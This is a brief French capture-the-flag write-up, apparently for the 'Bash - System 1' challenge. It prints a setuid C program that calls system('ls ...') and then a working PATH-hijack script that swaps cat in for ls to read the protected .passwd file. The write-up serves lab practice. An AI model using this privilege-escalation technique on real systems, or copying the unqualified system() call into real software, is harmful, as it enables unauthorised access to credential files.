# Bash - System 1

1. Code à éxécuter

```
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
 
int main(void)
{
    setreuid(geteuid(), geteuid());
    system("ls /challenge/app-script/ch11/.passwd");
    return 0;
}
```

## Exploitation du code

```
nano /tmp/flag.sh

#!/bin/bash
cp /bin/cat /tmp/ls
export PATH=/tmp
cd /challenge/app-script/ch11
./ch11
```

## Execution

```
cd /tmp
chmod 777 flag.sh
./flag.sh
```